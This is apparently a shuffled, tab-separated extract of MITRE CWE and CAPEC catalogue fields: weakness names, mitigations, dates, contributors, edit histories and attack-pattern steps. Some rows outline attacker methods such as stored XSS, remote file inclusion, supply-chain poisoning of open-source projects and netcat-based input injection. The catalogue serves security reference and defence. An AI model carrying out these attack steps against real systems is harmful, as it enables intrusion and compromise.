10069	40	The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.
24484	35	MITRE
6099	39	2008-09-08
15243	66	XSS Attacks
18370	39	2019-09-19
17269	35	MITRE
13393	28	CWE Content Team
9309	88	Information Exposure Through Debug Information
19984	39	2011-06-01
5609	28	CWE Content Team
7605	101	CAPEC Content Team
14472	62	updated Relationships, Taxonomy_Mappings
6712	39	2017-11-08
14305	52	When Certificate Pinning is being used in a mobile application, consider using a tool such as Spinner [REF-955].  This methodology might be extensible to other technologies.
8798	42	Follow the principle of least privilege when assigning access rights to entities in a software system.                   Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
14589	28	CWE Content Team
5764	34	This weakness typically appears in data-rich applications that save user inputs in a database.
11584	33	Microsoft
25104	62	updated Observed_Examples
22660	88	Reflection Attack in an Authentication Protocol
17516	100	The MITRE Corporation
13076	39	2008-10-14
8040	81	Other
20832	39	2012-05-11
8928	89	Standard
12321	91	Architecture and Design
6610	93	Defense in Depth
13258	26	Implementation
24606	63	Other
13519	50	Test custom written Regex with fuzzing to determine if the Regex is a poor one. Add timeouts to processes that handle the Regex logic. If an evil Regex is found rewrite it as a good Regex.
18566	62	updated References
19792	100	The MITRE Corporation
13776	35	Cigital
19405	72	Sometimes this is a factor in "flood" attacks, but other types of amplification exist.
7690	85	33
11350	62	updated Demonstrative_Examples
12586	103	Primary
22087	103	Primary
21719	39	2008-11-24
10457	62	updated Relationships, Taxonomy_Mappings
17788	51	2014-06-23
7262	28	CWE Content Team
11795	33	Paul Kocher
19230	102	ChildOf
16575	62	updated Relationships, Taxonomy_Mappings
10810	63	Modify Memory
6734	39	2019-06-20
5934	76	2018-07-31
25108	46	The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: "An enterprise bean must not attempt to listen on a socket, accept connections on a socket, or use a socket for multicast." The specification justifies this requirement in the following way: "The EJB architecture allows an enterprise bean instance to be a network socket client, but it does not allow it to be a network server. Allowing the instance to become a network server would conflict with the basic function of the enterprise bean-- to serve the EJB clients."
13036	35	MITRE
9285	39	2008-09-08
22146	79	Authorization
20829	63	DoS: Crash, Exit, or Restart
10277	39	2019-09-19
8309	101	CAPEC Content Team
7477	26	Implementation
16347	35	MITRE
25294	62	updated Related_Attack_Patterns
19605	95	[Detect Incorrect SOAP Parameter Handling] The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.
16216	62	updated Common_Consequences, Demonstrative_Examples, Taxonomy_Mappings
22009	90	Perl
24565	102	ChildOf
16612	35	MITRE
5816	39	2010-04-05
11564	39	2019-01-03
8625	35	MITRE
18324	62	updated Relationships
22297	81	Integrity
22474	28	CWE Content Team
13900	35	MITRE
7239	91	Implementation
21878	69	Incomplete
8982	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships
21188	21	7 Pernicious Kingdoms
24719	35	MITRE
24319	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20529	31	699
20249	43	Simple
17257	39	2008-09-08
7010	39	2012-10-30
9283	28	CWE Content Team
14729	62	updated Common_Consequences
13126	79	Availability
14851	81	Confidentiality
17162	32	Secunia
21586	97	Infiltration of Hardware Development Environment
23719	31	1000
19580	31	699
10748	35	MITRE
21976	28	Eric Dalci
9287	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
6622	28	CWE Content Team
22291	39	2019-06-20
25324	59	Updated Related_Attack_Patterns
9407	28	CWE Content Team
22490	62	updated Common_Consequences
13852	39	2018-03-27
12434	88	Improper Neutralization of Encoded URI Schemes in a Web Page
16021	23	This type of attack is a form of Cross-site Scripting (XSS) where a malicious script is persistenly "stored" within the data storage of a vulnerable web application. Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.
18532	46	In languages that are strictly typed but support casting/conversion, such as C or C++, the programmer might assume that casting one entity to the same type as another entity will ensure that the comparison will be performed correctly, but this cannot be guaranteed.  In languages that are not strictly typed, such as PHP or JavaScript, there may be implicit casting/conversion to a type that the programmer is unaware of, causing unexpected results; for example, the string "123" might be converted to a number type.  See examples.
12637	50	Implementation: Use Vista dir with the -R switch or utility to find Alternate Data Streams and take appropriate action with those discovered.
5593	39	2009-01-12
15547	39	2008-09-08
22184	76	2017-05-01
6577	103	Primary
8961	62	updated References, Relationships
13181	62	updated Relationships
17661	39	2008-08-15
18083	56	PeerOf
20695	100	The MITRE Corporation
16764	85	184
10755	49	2008
8960	39	2019-01-03
5732	62	updated Common_Consequences
20909	35	MITRE
8328	39	2008-07-01
13633	62	updated Common_Consequences, Maintenance_Notes, Other_Notes
13672	24	MITRE
21680	78	Medium
12844	88	Execution After Redirect (EAR)
15502	91	Implementation
7277	46	Two common programmer assumptions are "this function call can never fail" and "it doesn't matter if this function call fails". If an attacker can force the function to fail or otherwise return a value that is not expected, then the subsequent program logic could lead to a vulnerability, because the software is not in a state that the programmer assumes. For example, if the program calls a function to drop privileges but does not check the return code to ensure that privileges were successfully dropped, then the program will continue to operate with the higher privileges.
11340	28	Eric Dalci
16886	31	699
19713	31	699
20174	79	Authorization
15034	26	Architecture and Design
23346	63	Read Files or Directories
24850	56	ChildOf
19583	48	10
16379	85	95
8892	56	ChildOf
18164	76	2018-07-31
25001	62	updated Description, Relationships, Other_Notes
24204	23	The code uses deprecated or obsolete functions, which suggests that the code has not been actively reviewed or maintained.
7345	35	MITRE
24371	96	2008-09-08
22985	28	CWE Content Team
15026	91	Architecture and Design
14444	56	ChildOf
10396	44	SOAR Partial
6305	39	2010-04-05
10574	102	ChildOf
8158	42	Programming languages and supporting technologies might be chosen which are not subject to these issues.
21212	28	CWE Content Team
20100	69	Draft
15592	56	ChildOf
13252	62	updated Relationships, Taxonomy_Mappings
11459	100	The MITRE Corporation
22940	104	354
19250	31	1003
21081	39	2014-07-30
7890	39	2014-07-30
6453	81	Other
14881	28	CWE Content Team
6549	39	2008-07-01
6621	76	2017-05-01
16321	101	CAPEC Content Team
17258	61	Draft
6766	39	2017-11-08
21496	56	ChildOf
15226	35	Cigital
9676	76	2015-12-07
15446	42	Use runtime policy enforcement to create a whitelist of allowable commands, then prevent use of any command that does not appear in the whitelist. Technologies such as AppArmor are available to do this.
11765	28	CWE Content Team
13822	39	2009-12-28
23364	74	3
14982	35	MITRE
9537	31	1000
21470	28	CWE Content Team
12552	42	Use a restrictive caching policy for forms and web pages that potentially contain sensitive information.
17455	39	2009-10-29
13491	62	updated Relationships
5764	26	Architecture and Design
15344	35	MITRE
23163	88	Unparsed Raw Web Content Delivery
19622	96	2018-07-02
12185	78	Low
13542	53	The MITRE Corporation
25094	95	[Determine the relevent open-source code project to target] The adversary will make the selection based on various criteria:                                               The open-source code currently in use on a selected target system.                         The depth in the dependency graph of the open source code in relationship to other code bases in use on the target system. Choosing an OSS lower in the graph decreases the probability of discovery, but also decreases the scope of its use within the target system.                         The programming language in which the open source code is implemented. Different languages present different opportunities for using known software weaknesses.                         The quality of processes in place to make a contribution. For instance, some contribution sites use static and dynamic analysis tools, which could increase the probability of discovery.                         The security requirments necessary to make a contribution. For instance, is the ownership lax allowing unsigned commits or anonymous users.
17691	28	CWE Content Team
10447	62	updated Description, Name
13679	50	Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.
5813	80	To identify and execute against an over-privileged system interface
15007	99	SANS Software Security Institute
24625	28	CWE Content Team
7859	23	Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attackers' behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users.
8714	39	2014-07-30
7076	39	2008-09-08
24248	28	CWE Content Team
16021	50	Use browser technologies that do not allow client-side scripting.
22397	59	Updated References
5702	39	2017-05-03
9688	39	2012-05-11
13106	62	updated Related_Attack_Patterns, Relationships
20141	28	CWE Content Team
9075	23	The software may use insufficiently random numbers or values in a security context that depends on unpredictable numbers.
14984	28	CWE Content Team
9463	28	CWE Content Team
9617	31	1000
23974	79	Integrity
17170	39	2009-05-27
9175	28	CWE Content Team
18222	79	Availability
12064	62	updated Potential_Mitigations
7299	56	ChildOf
21006	56	ChildOf
13042	39	2008-07-01
20789	35	MITRE
8885	35	MITRE
22576	26	Architecture and Design
20739	43	Simple
17185	57	Indirect
9654	61	Draft
20356	62	updated Potential_Mitigations
20884	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
16746	63	Execute Unauthorized Code or Commands
15042	40	The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply.
21344	62	updated Relationships, Taxonomy_Mappings
21182	28	CWE Content Team
6113	39	2012-10-30
7230	101	CAPEC Content Team
5831	72	The data at a known pointer location can be easily read or influenced by an attacker.
16614	56	ChildOf
25039	35	Cigital
22858	39	2017-01-19
19161	103	Primary
14401	91	Implementation
17671	62	updated Relationships
20238	31	1000
11269	31	1000
16118	62	updated Observed_Examples, Taxonomy_Mappings
10334	88	Path Traversal: '/dir/../filename'
13525	62	updated Common_Consequences
25271	39	2011-06-01
15045	78	High
10025	88	Path Equivalence: 'filedir\' (Trailing Backslash)
21070	28	CWE Content Team
23891	39	2010-09-27
23250	62	updated Description, Name
10582	77	Fuzzing
10253	81	Availability
17858	94	Run Arbitrary Code
16706	91	Testing
16938	39	2014-07-30
7465	59	Updated References
15669	62	updated Demonstrative_Examples, References, Relationships
21288	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
5989	28	CWE Content Team
13914	39	2012-05-11
23717	50	Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.
20457	55	CAPEC Content Team
18076	76	2019-09-30
19811	81	Integrity
22063	35	MITRE
21836	81	Access Control
23793	90	Language-Independent
15837	56	ChildOf
22873	42	Do not use "_blank" targets. However, this can affect the usability of your application.
14468	63	Other
25270	62	updated Relationships
7929	28	CWE Content Team
6239	51	2014-06-23
22289	40	The targeted web site must include unpublished services within its web tree. The nature of these services determines the severity of this attack.
18949	61	Draft
7564	72	Crash of the consumer code of these resources resulting in information leakage or denial of service.
23870	62	updated Common_Consequences, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
19100	28	CWE Content Team
10139	45	Base
14527	28	CWE Content Team
24271	62	updated Time_of_Introduction
10325	28	CWE Content Team
15258	103	Primary
19685	39	2012-05-11
19106	100	The MITRE Corporation
17922	28	CWE Content Team
17295	35	MITRE
13661	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
16349	76	2019-09-30
20690	62	updated Demonstrative_Examples
19203	56	ChildOf
19123	50	Implementation: Session tokens for specific host
12759	28	CWE Content Team
18244	39	2017-01-19
16323	73	Use network-level packet injection tools such as netcat to inject input
19332	39	2012-05-11
14048	91	Architecture and Design
8625	39	2008-09-08
18611	39	2014-06-23
20962	35	MITRE
8051	54	Medium
13066	31	1000
25312	62	updated Relationships
6429	86	http://www.owasp.org/index.php/Top_10_2007
14701	28	CWE Content Team
21967	103	Primary
9643	91	Testing
25288	90	C#
7916	91	Implementation
21502	62	updated Potential_Mitigations
13078	56	CanPrecede
13035	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
12499	62	updated Relationships
21298	26	Architecture and Design
17697	90	Language-Independent
7945	35	MITRE
15791	35	MITRE
15928	63	DoS: Resource Consumption (Memory)
20411	40	The adversary must be cognizant of where fault injection vulnerabilities exist in the system in order to leverage them for exploitation.
9489	39	2017-11-08
11514	78	High
23394	95	[Authenticate to service] Authenticate to the service, if required, in order to explore it.
11883	28	CWE Content Team
12965	39	2008-07-01
10359	31	1003
21659	62	updated Potential_Mitigations, Time_of_Introduction
12938	53	The MITRE Corporation
19875	39	2008-09-08
19233	35	Cigital
21602	101	CAPEC Content Team
16075	69	Draft
9400	90	Language-Independent
8607	28	CWE Content Team
14814	88	Placement of User into Incorrect Group
20879	70	Secure Coding in C and C++
21711	26	Implementation
7495	35	MITRE
15192	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
20996	35	Cigital
10250	56	ChildOf
9779	42	The choice between a language which has named or unnamed exceptions needs to be done. While unnamed exceptions exacerbate the chance of not properly dealing with an exception, named exceptions suffer from the up call version of the weak base class problem.
10155	44	SOAR Partial
11716	47	Modify Data
21043	39	2014-07-30
15390	28	Eric Dalci
13302	62	updated Common_Consequences
15730	76	2019-09-30
17119	39	2019-06-20
17754	27	The attacker requires a tool that allows them to manually control the HTTP verb used to send messages to the targeted server.
22085	39	2009-07-17
23042	97	Web Services API Signature Forgery Leveraging Hash Function Extension Weakness
14091	72	Exploitation of this flaw can lead to the trust of data that may have originated with a spoofed source.
14325	104	546
13096	69	Draft
13695	28	CWE Content Team
12236	62	updated Time_of_Introduction
21925	88	Incomplete Blacklist to Cross-Site Scripting
14160	35	MITRE
24712	28	CWE Content Team
15562	78	High
23231	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
14821	39	2012-10-30
13362	42	Credentials stored in configuration files should be encrypted, Use standard APIs and industry accepted algorithms to encrypt the credentials stored in configuration files.
14255	56	ChildOf
15027	54	Medium
10485	62	updated Time_of_Introduction
8670	39	2018-03-27
14591	43	Simple
18167	49	2010
19725	33	Wikipedia
23077	47	Execute Unauthorized Commands
15333	80	Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.
12697	24	MITRE
6565	103	Primary
14052	46	This can be resultant, e.g. a buffer overflow might trigger a crash before the product can log the event.
19043	62	updated Relationships, Taxonomy_Mappings
15840	97	Lock Picking
5626	62	updated Relationships, Weakness_Ordinalities
5653	39	2014-07-30
6740	31	699
6927	28	CWE Content Team
5936	78	Very High
7267	28	CWE Content Team
23716	28	CWE Content Team
16325	39	2008-11-24
24144	62	updated Relationships, Taxonomy_Mappings
18221	101	CAPEC Content Team
19792	76	2017-05-01
20423	35	MITRE
25017	35	MITRE
22549	103	Primary
21204	58	Password systems are the simplest and most ubiquitous authentication mechanisms. However, they are subject to such well known attacks,and such frequent compromise that their use in the most simple implementation is not practical.
14007	103	Primary
13503	62	updated Relationships, Taxonomy_Mappings
8387	103	Primary
13662	35	MITRE
11008	44	SOAR Partial
14205	73	Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will not be processed and acted on by the outer parsing layer of the malicious content filters but will be by the inner application/web server layer. In this way it will be acted on by the application/web server as if it is a valid request from the client.
17702	43	Simple
18376	79	Access Control
13041	31	699
6038	62	updated Common_Consequences, Observed_Examples, Relationships
21528	39	2008-09-08
20489	28	CWE Content Team
17676	43	Simple
8771	28	Eric Dalci
19358	21	PLOVER
19794	81	Integrity
14912	62	updated Potential_Mitigations
7162	85	323
24052	31	1000
6442	28	CWE Content Team
18517	62	updated Relationships, Taxonomy_Mappings
6359	28	CWE Content Team
17484	39	2010-12-13
21385	35	MITRE
20677	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Use libraries or frameworks that make it easier to handle numbers without unexpected consequences.                   Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]
8969	59	Updated Resources_Required
21881	91	Implementation
19750	27	The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data.
12590	39	2011-06-01
15807	35	MITRE
17757	36	http://projects.webappsec.org/Cross-Site+Scripting
14793	62	updated Applicable_Platforms, Demonstrative_Examples
15570	28	CWE Content Team
23742	72	An unexpected return value could place the system in a state that could lead to a crash or other unintended behaviors.
22941	39	2012-05-11
6395	28	Eric Dalci
17354	103	Primary
23093	91	Implementation
7725	28	CWE Content Team
22672	28	CWE Content Team
18185	35	MITRE
16804	39	2008-07-01
8156	62	updated Relationships
15490	50	Implementation: Hide inner ordering of HTTP response header.
18481	39	2011-06-01
9447	62	updated Description, Observed_Examples, Other_Notes, Research_Gaps
17635	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
6881	39	2009-05-27
23747	53	The MITRE Corporation
23906	43	Simple
11461	35	MITRE
20339	62	updated Detection_Factors
9916	61	Draft
23558	39	2009-03-10
21342	28	CWE Content Team
6938	79	Availability
9582	35	MITRE
8725	39	2011-06-27
11300	62	updated Relationships, Taxonomy_Mappings
16416	90	C
13497	89	Standard
9670	97	ICMP Error Message Quoting Probe
11542	77	Dynamic Analysis with Manual Results Interpretation
14307	62	updated Relationships
14156	92	Exploit
12289	85	642
20932	31	699
16342	59	Updated Related_Weaknesses
8325	76	2017-05-01
12611	62	updated Common_Consequences
23036	100	The MITRE Corporation
5770	67	Medium
15755	76	2019-04-04
22280	28	CWE Content Team
23596	28	CWE Content Team
21082	72	An attacker that can trigger an assert statement can still lead to a denial of service if the relevant code can be triggered by an attacker, and if the scope of the assert() extends beyond the attacker's own session.
12348	39	2014-02-18
15390	35	Cigital
13886	62	updated Demonstrative_Examples
19620	33	Johannes Ullrich
6664	91	Architecture and Design
8308	57	Resultant
11830	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
16354	28	CWE Content Team
22113	47	Gain Privileges
15472	35	MITRE
10218	101	CAPEC Content Team
17678	39	2017-11-08
8851	90	Language-Independent
24406	28	CWE Content Team
24115	62	updated White_Box_Definitions
14236	28	CWE Content Team
18035	81	Other
17121	56	ChildOf
6625	62	updated Description, Name
10280	95	[Record and analyze timestamp values.] If the remote host is using timestamp, obtain several timestamps, analyze them and compare them to known values.
17150	59	Updated Consequences, Related_Attack_Patterns
24422	35	MITRE
21379	35	MITRE
10703	35	MITRE
17739	85	309
14938	91	Implementation
16805	42	Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications.
20092	62	updated Relationships
13813	69	Draft
20672	28	CWE Content Team
20842	85	59
12579	62	updated Causal_Nature, Observed_Examples, Taxonomy_Mappings
14509	35	Cigital
18331	91	Implementation
21008	39	2008-09-08
16295	21	PLOVER
13902	62	updated Time_of_Introduction
16738	28	CWE Content Team
22296	79	Authentication
23496	62	updated Relationships, Other_Notes, Taxonomy_Mappings
11199	28	CWE Content Team
22315	28	CWE Content Team
20248	31	699
18402	28	CWE Content Team
24526	28	CWE Content Team
17949	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
20351	35	MITRE
19930	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
20548	23	The product opens an alternate channel to communicate with an authorized user, but the channel is accessible to other actors.
9454	27	Access to a terminal on the target network
18343	43	Simple
6855	89	Detailed
15496	76	2019-04-04
21120	79	Confidentiality
11399	90	Language-Independent
11786	28	CWE Content Team
23013	62	updated Description, Name
22541	88	Improper Neutralization of Value Delimiters
7368	63	Execute Unauthorized Code or Commands
15730	59	Updated Related_Attack_Patterns
5705	62	updated Potential_Mitigations
16623	73	Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).
16559	62	updated Common_Consequences
9809	101	CAPEC Content Team
15521	39	2010-09-27
18450	70	RFC 1738 - Uniform Resource Locators (URL)
22239	35	MITRE
9768	81	Other
10822	81	Access Control
8188	28	CWE Content Team
14896	102	CanPrecede
6796	90	Language-Independent
24651	48	10
9377	62	updated Applicable_Platforms
21536	44	High
8871	39	2012-10-30
16002	76	2019-09-30
14138	95	[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.
8041	56	ChildOf
18049	62	updated Description
12470	53	The MITRE Corporation
23518	28	CWE Content Team
10192	28	CWE Content Team
19895	97	Leveraging/Manipulating Configuration File Search Paths
22606	39	2010-06-21
6991	69	Draft
10019	31	1000
25028	62	updated Potential_Mitigations
12783	56	ChildOf
6029	73	Determine minimum and maximum allowed password lengths.
10354	39	2008-07-01
13159	23	An attacker with access to a manufacturer's documentation alters the descriptions of system capabilities with the intent of causing errors in derived system requirements, impacting the overall effectiveness and capability of the system, allowing an attacker to take advantage of the introduced system capability flaw once the system is deployed.
9764	72	This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.
9179	46	The sensitive information could be read by attackers with access to the file, or with physical or administrator access to the raw disk. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.
14921	59	Updated Description, Example_Instances
6217	86	http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581
10024	26	Implementation
23058	28	CWE Content Team
23539	39	2011-06-27
17064	35	MITRE
9323	62	updated Demonstrative_Examples, Name, Potential_Mitigations, References, Time_of_Introduction
12574	35	MITRE
15330	35	KDM Analytics
17879	88	Use of Less Trusted Source
6063	28	CWE Content Team
20943	89	Detailed
22679	35	MITRE
6698	102	CanFollow
23287	25	Low
7630	28	CWE Content Team
23229	91	Requirements
11776	31	699
17005	62	updated Alternate_Terms, Background_Details, Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings
10949	23	SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata (to effect a denial of service), and delete information about service provider interfaces. WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. The attacker that can rewrite WS-addressing information gains the ability to route service requesters to any service providers, and the ability to route service provider response to any service. Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol. The basic flow for the attacker consists of either altering the data at rest in the registry or uploading malicious content by spoofing a service provider. The service requester is then redirected to send its requests and/or responses to services the attacker controls.
14639	28	CWE Content Team
25315	39	2019-01-03
11182	50	Refer to the RFCs to safely decode URL.
19598	77	Automated Static Analysis
17432	67	High
21512	72	Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service.
10000	44	Moderate
19923	50	In the case of path traversals, use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.
13509	81	Non-Repudiation
18784	35	MITRE
17377	28	CWE Content Team
6049	74	3
18421	74	2
24531	35	Cigital
16563	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
14189	59	Updated @Abstraction, Related_Attack_Patterns
12278	62	updated Taxonomy_Mappings
22518	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
17527	92	Explore
19065	101	CAPEC Content Team
23855	28	CWE Content Team
6577	56	ChildOf
16584	39	2019-06-20
20355	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
23214	28	CWE Content Team
15686	35	MITRE
11755	42	Inputs should be decoded and canonicalized to the application's current internal representation before being filtered.
10364	35	MITRE
19138	35	MITRE
13858	28	CWE Content Team
11440	100	The MITRE Corporation
19531	56	ChildOf
12423	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
21044	81	Availability
22964	26	Implementation
14692	35	MITRE
14072	39	2008-07-01
14507	26	Implementation
22592	31	1000
13893	28	CWE Content Team
16271	35	MITRE
19273	50	Design: Use obfuscation and other techniques to prevent reverse engineering the client code.
21998	95	Attacker then provides input, perhaps by way of environment variables for the process in question, that affect the executing thread
13447	97	Cache Poisoning
17034	61	Draft
22116	26	Architecture and Design
22818	28	CWE Content Team
8221	43	Simple
23537	104	525
10687	103	Primary
12767	43	Simple
12806	35	MITRE
17893	35	MITRE
8870	62	updated Time_of_Introduction
10208	39	2009-05-27
21748	47	Other
24299	56	ChildOf
8865	35	MITRE
15231	33	Joel Scambray
14225	39	2011-06-01
12255	39	2019-01-03
23617	62	updated Relationships
15434	39	2011-06-01
22424	49	2010
21134	40	Some variants of this attack may require that old versions of some code files be present and in predictable locations.
8305	28	CWE Content Team
13878	39	2008-11-24
21680	85	218
17999	39	2009-05-27
7625	103	Primary
9838	39	2017-01-19
17559	76	2018-07-31
12295	76	2017-08-04
20830	35	Cigital
11392	102	ChildOf
6600	69	Incomplete
25108	69	Draft
15179	59	Updated Related_Attack_Patterns
18757	47	Other
20773	79	Authorization
10842	28	CWE Content Team
16881	79	Confidentiality
12242	62	updated References, Relationships, Taxonomy_Mappings
11552	78	Low
7653	62	updated Relationships
17914	39	2019-01-03
8426	35	MITRE
24348	35	Cigital
16558	59	Updated Description Summary, Examples-Instances, References
19084	100	The MITRE Corporation
11552	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
10087	44	High
20650	62	updated Other_Notes, Relationship_Notes, Terminology_Notes
20086	39	2008-10-14
23187	35	MITRE
16087	74	3
16498	28	CWE Content Team
24436	74	3
13750	73	Manually execute a local command (such as 'pwd') via the URL inputs.
13697	62	updated Demonstrative_Examples
12445	63	Read Application Data
25368	73	Fuzzing of communications protocols
14832	97	HTTP Flood
22557	91	Implementation
17935	62	updated Other_Notes, Relationship_Notes
23784	59	Updated Related_Attack_Patterns
8851	43	Simple
13928	39	2008-07-01
16948	28	Eric Dalci
8094	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
16771	43	Simple
21452	39	2010-02-16
6080	39	2011-09-13
24445	73	Obtain cookie from local memory or filesystem using a utility such as the Firefox Cookie Manager or AnEC Cookie Editor.
12006	35	MITRE
8311	35	Apple
24880	28	CWE Content Team
16923	35	MITRE
11318	79	Confidentiality
22835	62	updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples
19292	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
15456	76	2015-11-09
10633	62	updated Potential_Mitigations
20242	28	CWE Content Team
16921	62	updated Relationships
12160	61	Draft
23664	63	Read Application Data
13830	31	1000
23884	28	CWE Content Team
10741	39	2008-07-01
15894	62	updated Time_of_Introduction
21616	62	updated Description, Name
21680	27	The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.
18900	40	Predictable session identifiers
9457	23	In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized "include" or "require" call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.
19870	77	Manual Static Analysis - Source Code
